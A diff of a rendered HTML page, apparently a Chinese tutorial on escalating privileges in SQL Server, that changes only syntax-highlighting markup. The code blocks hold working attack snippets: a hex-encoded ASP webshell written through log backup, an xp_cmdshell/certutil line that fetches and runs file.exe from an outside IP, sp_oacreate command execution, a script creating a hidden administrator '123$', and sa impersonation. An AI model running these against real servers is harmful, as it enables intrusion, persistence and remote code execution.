 </div><p>差异备份有多种情况可能不成功，一般就是目录权限的问题，第一次备份的目录是否可能没有权限，第二次备份到网站目录是否有权限，所以一般不要直接备份到 c 盘根目录</p>
 <p>当过滤了特殊的字符比如单引号，或者路径符号都可以使用前面提到的定义局部变量来执行。</p>
@@ -810,16 +810,16 @@ c:<span class="se">\w</span>ww<span class="se">\1</span>.aspx
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">alter</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="err">库名</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">RECOVERY</span><span class="w"> </span><span class="k">FULL</span><span class="w"> 
-</span><span class="w">
-</span><span class="w"></span><span class="k">create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="p">(</span><span class="n">a</span><span class="w"> </span><span class="n">image</span><span class="p">)</span><span class="w"> 
-</span><span class="w">
-</span><span class="w"></span><span class="n">backup</span><span class="w"> </span><span class="n">log</span><span class="w"> </span><span class="err">库名</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">disk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;c:\xxx&#39;</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">init</span><span class="w"> 
-</span><span class="w">
-</span><span class="w"></span><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="w"> </span><span class="k">values</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="n">x3C25657865637574652872657175657374282261222929253E</span><span class="p">)</span><span class="w"> 
-</span><span class="w">
-</span><span class="w"></span><span class="n">backup</span><span class="w"> </span><span class="n">log</span><span class="w"> </span><span class="err">库名</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">disk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;c:\xxx\2.asp&#39;</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">alter</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="err">库名</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="n">RECOVERY</span><span class="w"> </span><span class="k">FULL</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="p">(</span><span class="n">a</span><span class="w"> </span><span class="n">image</span><span class="p">)</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">backup</span><span class="w"> </span><span class="n">log</span><span class="w"> </span><span class="err">库名</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">disk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;c:\xxx&#39;</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">init</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="w"> </span><span class="k">values</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="n">x3C25657865637574652872657175657374282261222929253E</span><span class="p">)</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">backup</span><span class="w"> </span><span class="n">log</span><span class="w"> </span><span class="err">库名</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">disk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;c:\xxx\2.asp&#39;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>相对于差异备份，log 备份的好处就是备份出来的 webshell 的文件大小非常的小。</p>
 <h3 id="52-xp_cmdshell">5.2 xp_cmdshell</h3>
@@ -848,10 +848,10 @@ c:<span class="se">\w</span>ww<span class="se">\1</span>.aspx
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">exec</span><span class="w"> </span><span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;cd c:\www &amp; certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe&#39;</span><span class="p">;</span><span class="w">
-</span><span class="w">
-</span><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;cd c:\www &amp; file.exe&#39;</span><span class="p">;</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">exec</span><span class="w"> </span><span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;cd c:\www &amp; certutil -urlcache -split -f http://192.168.130.142:80/download/file.exe&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;cd c:\www &amp; file.exe&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="53-sp_oacreate">5.3 sp_oacreate</h3>
 <p>当 xp_cmdshell 被删除可以使用这个来提权试试，恢复 sp_oacreate</p>
@@ -864,12 +864,12 @@ c:<span class="se">\w</span>ww<span class="se">\1</span>.aspx
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">  
-</span><span class="w"></span><span class="n">RECONFIGURE</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="n">OVERRIDE</span><span class="p">;</span><span class="w">  
-</span><span class="w"></span><span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;Ole Automation Procedures&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">  
-</span><span class="w"></span><span class="n">RECONFIGURE</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="n">OVERRIDE</span><span class="p">;</span><span class="w">  
-</span><span class="w"></span><span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">RECONFIGURE</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="n">OVERRIDE</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;Ole Automation Procedures&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">RECONFIGURE</span><span class="w"> </span><span class="k">WITH</span><span class="w"> </span><span class="n">OVERRIDE</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>sp_oacreate 是一个非常危险的存储过程可以删除、复制、移动文件。还能配合 sp_oamethod 来写文件执行 cmd。</p>
 <p>有以下几种利用思路：</p>
@@ -891,18 +891,18 @@ c:<span class="se">\w</span>ww<span class="se">\1</span>.aspx
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="n">wscript</span><span class="p">.</span><span class="n">shell</span><span class="w"> </span><span class="err">执行命令</span><span class="w">
-</span><span class="w">
-</span><span class="w"></span><span class="k">declare</span><span class="w"> </span><span class="o">@</span><span class="n">shell</span><span class="w"> </span><span class="nb">int</span><span class="w"> </span><span class="k">exec</span><span class="w"> </span><span class="n">sp_oacreate</span><span class="w"> </span><span class="s1">&#39;wscript.shell&#39;</span><span class="p">,</span><span class="o">@</span><span class="n">shell</span><span class="w"> </span><span class="k">output</span><span class="w"> </span><span class="k">exec</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">shell</span><span class="p">,</span><span class="s1">&#39;run&#39;</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="s1">&#39;c:\windows\system32\cmd.exe /c xxx&#39;</span><span class="w">
-</span><span class="w">
-</span><span class="w">
-</span><span class="w">
-</span><span class="w"></span><span class="n">Shell</span><span class="p">.</span><span class="n">Application</span><span class="w"> </span><span class="err">执行命令</span><span class="w">
-</span><span class="w">
-</span><span class="w"></span><span class="k">declare</span><span class="w"> </span><span class="o">@</span><span class="n">o</span><span class="w"> </span><span class="nb">int</span><span class="w">
-</span><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="n">sp_oacreate</span><span class="w"> </span><span class="s1">&#39;Shell.Application&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">o</span><span class="w"> </span><span class="k">out</span><span class="w">
-</span><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">o</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;ShellExecute&#39;</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;cmd.exe&#39;</span><span class="p">,</span><span class="s1">&#39;cmd /c net user &gt;c:\test.txt&#39;</span><span class="p">,</span><span class="s1">&#39;c:\windows\system32&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">;</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">wscript</span><span class="p">.</span><span class="n">shell</span><span class="w"> </span><span class="err">执行命令</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">declare</span><span class="w"> </span><span class="o">@</span><span class="n">shell</span><span class="w"> </span><span class="nb">int</span><span class="w"> </span><span class="k">exec</span><span class="w"> </span><span class="n">sp_oacreate</span><span class="w"> </span><span class="s1">&#39;wscript.shell&#39;</span><span class="p">,</span><span class="o">@</span><span class="n">shell</span><span class="w"> </span><span class="k">output</span><span class="w"> </span><span class="k">exec</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">shell</span><span class="p">,</span><span class="s1">&#39;run&#39;</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="s1">&#39;c:\windows\system32\cmd.exe /c xxx&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Shell</span><span class="p">.</span><span class="n">Application</span><span class="w"> </span><span class="err">执行命令</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">declare</span><span class="w"> </span><span class="o">@</span><span class="n">o</span><span class="w"> </span><span class="nb">int</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="n">sp_oacreate</span><span class="w"> </span><span class="s1">&#39;Shell.Application&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">o</span><span class="w"> </span><span class="k">out</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">o</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;ShellExecute&#39;</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;cmd.exe&#39;</span><span class="p">,</span><span class="s1">&#39;cmd /c net user &gt;c:\test.txt&#39;</span><span class="p">,</span><span class="s1">&#39;c:\windows\system32&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>写入启动项</li>
@@ -923,19 +923,19 @@ c:<span class="se">\w</span>ww<span class="se">\1</span>.aspx
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">declare</span><span class="w"> </span><span class="o">@</span><span class="n">sp_passwordxieo</span><span class="w"> </span><span class="nb">int</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="w"> </span><span class="nb">int</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">t</span><span class="w"> </span><span class="nb">int</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="nb">int</span><span class="w">
-</span><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="n">sp_oacreate</span><span class="w"> </span><span class="s1">&#39;scripting.filesystemobject&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">sp_passwordxieo</span><span class="w"> </span><span class="k">out</span><span class="w">
-</span><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">sp_passwordxieo</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;createtextfile&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="w"> </span><span class="k">out</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;d:\RECYCLER\1.vbs&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w">
-</span><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;set wsnetwork=CreateObject(&#34;WSCRIPT.NETWORK&#34;)&#39;</span><span class="w">
-</span><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;os=&#34;WinNT://&#34;&amp;wsnetwork.ComputerName&#39;</span><span class="w">
-</span><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;Set ob=GetObject(os)&#39;</span><span class="w">
-</span><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;Set oe=GetObject(os&amp;&#34;/Administrators,group&#34;)&#39;</span><span class="w">
-</span><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;Set od=ob.Create(&#34;user&#34;,&#34;123$&#34;)&#39;</span><span class="w">
-</span><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;od.SetPassword &#34;123&#34;&#39;</span><span class="w">
-</span><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;od.SetInfo&#39;</span><span class="w">
-</span><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;Set of=GetObject(os&amp;&#34;/123$&#34;,user)&#39;</span><span class="w">
-</span><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;oe.add os&amp;&#34;/123$&#34;&#39;</span><span class="p">;</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">declare</span><span class="w"> </span><span class="o">@</span><span class="n">sp_passwordxieo</span><span class="w"> </span><span class="nb">int</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="w"> </span><span class="nb">int</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">t</span><span class="w"> </span><span class="nb">int</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="nb">int</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="n">sp_oacreate</span><span class="w"> </span><span class="s1">&#39;scripting.filesystemobject&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">sp_passwordxieo</span><span class="w"> </span><span class="k">out</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">sp_passwordxieo</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;createtextfile&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="w"> </span><span class="k">out</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;d:\RECYCLER\1.vbs&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;set wsnetwork=CreateObject(&#34;WSCRIPT.NETWORK&#34;)&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;os=&#34;WinNT://&#34;&amp;wsnetwork.ComputerName&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;Set ob=GetObject(os)&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;Set oe=GetObject(os&amp;&#34;/Administrators,group&#34;)&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;Set od=ob.Create(&#34;user&#34;,&#34;123$&#34;)&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;od.SetPassword &#34;123&#34;&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;od.SetInfo&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;Set of=GetObject(os&amp;&#34;/123$&#34;,user)&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">exec</span><span class="w"> </span><span class="o">@</span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sp_oamethod</span><span class="w"> </span><span class="o">@</span><span class="n">f</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;writeline&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="s1">&#39;oe.add os&amp;&#34;/123$&#34;&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="54-沙盒提权">5.4 沙盒提权</h3>
 <p>沙盒模式是数据库的一种安全功能。在沙盒模式下，只对控件和字段属性中的安全且不含恶意代码的表达式求值。如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。</p>
@@ -969,12 +969,12 @@ c:<span class="se">\w</span>ww<span class="se">\1</span>.aspx
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">USE master;
-GRANT IMPERSONATE ON LOGIN::sa to [MyUser1];
-GRANT IMPERSONATE ON LOGIN::MyUser2 to [MyUser1];
-GRANT IMPERSONATE ON LOGIN::MyUser3 to [MyUser1];
-GO
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">USE master;
+</span></span><span class="line"><span class="cl">GRANT IMPERSONATE ON LOGIN::sa to [MyUser1];
+</span></span><span class="line"><span class="cl">GRANT IMPERSONATE ON LOGIN::MyUser2 to [MyUser1];
+</span></span><span class="line"><span class="cl">GRANT IMPERSONATE ON LOGIN::MyUser3 to [MyUser1];
+</span></span><span class="line"><span class="cl">GO
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="552--查找可以模拟登录的用户">5.5.2  查找可以模拟登录的用户</h4>
 <p>默认情况下，系统管理员可以模拟任何人，但是正常登录必须分配权限来模拟特定的用户，使用 MyUser1 用户登录，打开新建查询，执行下面语句查询那些用户可以用来模拟登录</p>
@@ -987,12 +987,12 @@ GO
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">SELECT distinct b.name
-FROM sys.server_permissions a
-INNER JOIN sys.server_principals b
-ON a.grantor_principal_id = b.principal_id
-WHERE a.permission_name = &#39;IMPERSONATE&#39;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SELECT distinct b.name
+</span></span><span class="line"><span class="cl">FROM sys.server_permissions a
+</span></span><span class="line"><span class="cl">INNER JOIN sys.server_principals b
+</span></span><span class="line"><span class="cl">ON a.grantor_principal_id = b.principal_id
+</span></span><span class="line"><span class="cl">WHERE a.permission_name = &#39;IMPERSONATE&#39;
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>这里我们可以看到 MyUser1 用户可以模拟登录 sa, MyUser2, MyUser2 用户，接下来就是模拟登录 sa 来获取 sysadmin 权限了</p>
 <p><img
@@ -1016,15 +1016,15 @@ WHERE a.permission_name = &#39;IMPERSONATE&#39;
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="c1">-- 验证是否为sysadmin权限
-</span><span class="c1"></span><span class="k">SELECT</span><span class="w"> </span><span class="k">SYSTEM_USER</span><span class="w">
-</span><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">)</span><span class="w">
-</span><span class="w"></span><span class="c1">-- 模拟sa登录
-</span><span class="c1"></span><span class="k">EXECUTE</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">LOGIN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="w">
-</span><span class="w"></span><span class="c1">-- 验证是否为sysadmin权限
-</span><span class="c1"></span><span class="k">SELECT</span><span class="w"> </span><span class="k">SYSTEM_USER</span><span class="w">
